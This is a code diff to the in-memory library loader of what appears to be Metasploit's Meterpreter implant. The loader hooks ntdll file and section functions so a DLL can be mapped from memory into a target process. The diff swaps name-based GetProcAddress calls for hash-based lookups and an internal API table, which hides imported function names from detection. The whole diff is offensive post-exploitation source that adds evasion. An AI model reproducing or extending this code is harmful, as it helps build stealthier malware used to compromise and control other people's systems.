@@ -15,6 +15,7 @@
  * in order to integrate it with meterpreter.
  */
 #include "metsrv.h"
+#include "winapi.h"
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <stdio.h>
@@ -376,17 +377,17 @@ void install_hooks(SHELLCODE_CTX *ctx)
 	f_NtClose lNtClose;
 	HMODULE ntdll;
 
-	if (!(ntdll = LoadLibrary(TEXT("ntdll"))))
+	if (!(ntdll = met_api->win_api.kernel32.LoadLibraryA("ntdll")))
 	{
 		return;
 	}
 
-	lNtMapViewOfSection = (f_NtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
-	lNtQueryAttributesFile = (f_NtQueryAttributesFile)GetProcAddress(ntdll, "NtQueryAttributesFile");
-	lNtOpenFile = (f_NtOpenFile)GetProcAddress(ntdll, "NtOpenFile");
-	lNtCreateSection = (f_NtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
-	lNtOpenSection = (f_NtOpenSection)GetProcAddress(ntdll, "NtOpenSection");
-	lNtClose = (f_NtClose)GetProcAddress(ntdll, "NtClose");
+	lNtMapViewOfSection = (f_NtMapViewOfSection)GetProcAddressH(ntdll, H_ZwMapViewOfSection);
+	lNtQueryAttributesFile = (f_NtQueryAttributesFile)GetProcAddressH(ntdll, H_ZwQueryAttributesFile);
+	lNtOpenFile = (f_NtOpenFile)GetProcAddressH(ntdll, H_ZwOpenFile);
+	lNtCreateSection = (f_NtCreateSection)GetProcAddressH(ntdll, H_ZwCreateSection);
+	lNtOpenSection = (f_NtOpenSection)GetProcAddressH(ntdll, H_ZwOpenSection);
+	lNtClose = (f_NtClose)GetProcAddressH(ntdll, H_ZwClose);
 
 	/* NtMapViewOfSection */
 
@@ -474,12 +475,12 @@ void remove_hooks(SHELLCODE_CTX *ctx)
 		return;
 	}
 
-	lNtMapViewOfSection = (f_NtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
-	lNtQueryAttributesFile = (f_NtQueryAttributesFile)GetProcAddress(ntdll, "NtQueryAttributesFile");
-	lNtOpenFile = (f_NtOpenFile)GetProcAddress(ntdll, "NtOpenFile");
-	lNtCreateSection = (f_NtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
-	lNtOpenSection = (f_NtOpenSection)GetProcAddress(ntdll, "NtOpenSection");
-	lNtClose = (f_NtClose)GetProcAddress(ntdll, "NtClose");
+	lNtMapViewOfSection = (f_NtMapViewOfSection)GetProcAddressH(ntdll, H_ZwMapViewOfSection);
+	lNtQueryAttributesFile = (f_NtQueryAttributesFile)GetProcAddressH(ntdll, H_ZwQueryAttributesFile);
+	lNtOpenFile = (f_NtOpenFile)GetProcAddressH(ntdll, H_ZwOpenFile);
+	lNtCreateSection = (f_NtCreateSection)GetProcAddressH(ntdll, H_ZwCreateSection);
+	lNtOpenSection = (f_NtOpenSection)GetProcAddressH(ntdll, H_ZwOpenSection);
+	lNtClose = (f_NtClose)GetProcAddressH(ntdll, H_ZwClose);
 
 	/* NtMapViewOfSection */
 	restore_function(ctx, (DWORD_PTR)lNtMapViewOfSection,
@@ -535,23 +536,14 @@ void map_file(SHELLCODE_CTX *ctx)
 
 	/* Lock the mapping in memory */
 	{
-		ULONG (_stdcall *NtLockVirtualMemory)(HANDLE, PVOID *, PULONG, ULONG);
+		PVOID base = (PVOID)ctx->mapped_address;
+		ULONG sz = nt->OptionalHeader.SizeOfImage;
 
-		NtLockVirtualMemory = (ULONG (_stdcall *)(HANDLE, PVOID *, PULONG, ULONG))GetProcAddress(
-				GetModuleHandleA("ntdll"),
-				"NtLockVirtualMemory");
-
-		if (NtLockVirtualMemory)
-		{
-			PVOID base = (PVOID)ctx->mapped_address;
-			ULONG sz = nt->OptionalHeader.SizeOfImage;
-
-			NtLockVirtualMemory(
-					(HANDLE)-1,
-					&base,
-					&sz,
-					1);
-		}
+		met_api->win_api.ntdll.ZwLockVirtualMemory(
+				(HANDLE)-1,
+				&base,
+				&sz,
+				1);
 	}
 
 	/* Write headers */
